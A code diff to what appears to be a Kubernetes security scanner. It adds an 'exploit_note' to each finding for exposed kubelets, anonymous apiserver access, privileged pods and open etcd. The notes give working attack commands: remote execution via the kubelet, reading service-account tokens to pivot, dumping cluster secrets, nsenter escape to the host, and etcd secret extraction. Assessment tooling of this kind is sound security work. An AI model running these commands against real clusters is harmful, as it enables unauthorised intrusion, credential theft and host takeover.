@@ -453,7 +453,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Set --anonymous-auth=false AND --authorization-mode=Webhook "
                     "on the kubelet. Restrict the kubelet port to control-plane "
                     "traffic only.",
-                    ["CWE-306", "CWE-77", "CWE-284"], kind="kubelet_exec"))
+                    ["CWE-306", "CWE-77", "CWE-284"], kind="kubelet_exec",
+                    exploit_note=(
+                        "curl -sk -X POST https://<ip>:10250/run/<ns>/<pod>/<container> "
+                        "-d 'cmd=id' — RCE inside pod, then cat "
+                        "/var/run/secrets/kubernetes.io/serviceaccount/token to pivot "
+                        "to apiserver."),
+                    depth_tier="t1"))
 
             if r == "kubelet" and pr.get("anon_logs_dir"):
                 out.append(_finding(
@@ -471,7 +477,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "or turn off anonymous auth on the kubelet "
                     "(--anonymous-auth=false, --authorization-mode=Webhook); "
                     "patch Windows kubelets to a version that fixes CVE-2024-9042.",
-                    ["CWE-22", "CWE-306", "CWE-532"], kind="kubelet_logs_dir"))
+                    ["CWE-22", "CWE-306", "CWE-532"], kind="kubelet_logs_dir",
+                    exploit_note=(
+                        "curl -sk https://<ip>:10250/logs/kube-apiserver.log — read "
+                        "audit logs, extract impersonated identities and bearer "
+                        "tokens; for Windows kubelets, try CVE-2024-9042 payload "
+                        "(parameter injection into file path)."),
+                    depth_tier="t1"))
 
             if r == "kubelet" and pr.get("anon_pods"):
                 out.append(_finding(
@@ -486,7 +498,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "exec \"id\" -p <pod> -c <container> -n <ns>   # RCE in a pod (ROE)",
                     "Set --anonymous-auth=false and --authorization-mode=Webhook on the "
                     "kubelet; firewall 10250.",
-                    ["CWE-306", "CWE-284", "CWE-269"], kind="kubelet_anon"))
+                    ["CWE-306", "CWE-284", "CWE-269"], kind="kubelet_anon",
+                    exploit_note=(
+                        "kubeletctl -i --server <ip> pods; kubeletctl exec 'cat "
+                        "/var/run/secrets/kubernetes.io/serviceaccount/token' -p "
+                        "<pod> -n <ns> — token = kubectl access. Try kubectl "
+                        "--token=<X> get secrets -A."),
+                    depth_tier="t1"))
             elif r == "kubelet-ro" and pr.get("anon_pods"):
                 out.append(_finding(
                     "high", "Kubelet read-only port exposes pod specs (secret leak)",
@@ -498,7 +516,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "curl",
                     "curl -s http://<ip>:10255/pods | jq '.items[].spec.containers[].env'",
                     "Disable the read-only port (--read-only-port=0).",
-                    ["CWE-306", "CWE-200"], kind="kubelet_ro"))
+                    ["CWE-306", "CWE-200"], kind="kubelet_ro",
+                    exploit_note=(
+                        "curl -s http://<ip>:10255/pods | jq -r "
+                        "'.items[].spec.containers[] | .env[]? | "
+                        "\"\\(.name)=\\(.value)\"' | grep -Ei 'PASS|KEY|TOKEN|URL'"),
+                    depth_tier="t1"))
             elif r == "apiserver":
                 if pr.get("anon_list"):
                     sec = pr.get("anon_secrets")
@@ -518,7 +541,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "Never bind roles to system:anonymous / system:unauthenticated; "
                         "set --anonymous-auth=false.",
                         ["CWE-306", "CWE-284", "CWE-269"] if sec
-                        else ["CWE-306", "CWE-284"], kind="api_anon_list"))
+                        else ["CWE-306", "CWE-284"], kind="api_anon_list",
+                        exploit_note=(
+                            "kubectl --server https://<ip>:<port> "
+                            "--insecure-skip-tls-verify get secrets -A -o json | jq "
+                            "-r '.items[] | select(.type==\"kubernetes.io/"
+                            "service-account-token\") | .data.token' | base64 -d — "
+                            "use each token as a bearer for further kubectl calls."),
+                        depth_tier="t1"))
                     # Additional anonymous-readable resources on the apiserver.
                     extra_reads = []
                     if pr.get("anon_configmaps"): extra_reads.append("configmaps (often store secrets in plaintext)")
@@ -538,7 +568,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                             "get configmaps,serviceaccounts,clusterrolebindings -A -o yaml",
                             "Same fix — remove all bindings for system:anonymous; "
                             "set --anonymous-auth=false.",
-                            ["CWE-200", "CWE-284"], kind="api_anon_resources"))
+                            ["CWE-200", "CWE-284"], kind="api_anon_resources",
+                            exploit_note=(
+                                "kubectl ... get clusterrolebindings -o json | jq "
+                                "'.items[] | select(.subjects[]?.name==\""
+                                "system:anonymous\")' — any hit = the anonymous user "
+                                "IS cluster-admin. kubectl get configmaps -A -o yaml "
+                                "| grep -Ei 'password|token|api_key'"),
+                            depth_tier="t1"))
                     # Escape-route pod counts.
                     ec = pr.get("escape_pod_counts") or {}
                     if any(ec.get(k, 0) > 0 for k in ("privileged", "hostPath",
@@ -558,7 +595,15 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                             "Apply Pod Security Admission (baseline or restricted) to "
                             "every namespace; deny hostPath, hostPID, privileged in "
                             "PodSecurity policy.",
-                            ["CWE-269", "CWE-284"], kind="k8s_escape_pods"))
+                            ["CWE-269", "CWE-284"], kind="k8s_escape_pods",
+                            exploit_note=(
+                                "kubectl --server https://<ip>:<port> get pods -A -o "
+                                "json | jq -r '.items[] | select(.spec.hostPID==true "
+                                "or (.spec.containers[]?.securityContext.privileged"
+                                "==true)) | \"\\(.metadata.namespace)/\\(.metadata."
+                                "name)\"'; then via kubelet exec: nsenter -t 1 -m -u "
+                                "-i -n -p sh."),
+                            depth_tier="t1"))
                 # NOTE: this used to be `elif`, chained to a `r == "kubelet"` test
                 # that sat inside this `elif r == "apiserver"` branch and could
                 # therefore never be true. The dead test is gone (moved to the
@@ -601,7 +646,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "system:anonymous or system:unauthenticated; set "
                         "--anonymous-auth=false on the apiserver.",
                         ["CWE-306", "CWE-284"] + (["CWE-269"] if dangerous else []),
-                        kind="api_anon_ssrr"))
+                        kind="api_anon_ssrr",
+                        exploit_note=(
+                            "If mutating verbs present: kubectl --server ... "
+                            "--as=system:anonymous create -f privileged-pod.yaml; "
+                            "else focus on the read verbs already covered by "
+                            "api_anon_list."),
+                        depth_tier="t1"))
             elif r == "etcd" and (pr.get("v2_readable") or pr.get("v3_readable")):
                 api = "v2 keys" if pr.get("v2_readable") else "v3 gRPC-gateway"
                 out.append(_finding(
@@ -615,7 +666,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "; ... get /registry/secrets/... (dump secrets - ROE)",
                     "Require client-certificate auth and peer TLS on etcd "
                     "(--client-cert-auth, --peer-client-cert-auth); firewall 2379/2380.",
-                    ["CWE-306", "CWE-200", "CWE-284"], kind="etcd_open"))
+                    ["CWE-306", "CWE-200", "CWE-284"], kind="etcd_open",
+                    exploit_note=(
+                        "ETCDCTL_API=3 etcdctl --endpoints http://<ip>:2379 get "
+                        "/registry/secrets/ --prefix -w json | jq -r '.kvs[] | .value "
+                        "| @base64d' — decrypt SA tokens and cluster TLS."),
+                    depth_tier="t1"))
     return out
 
 
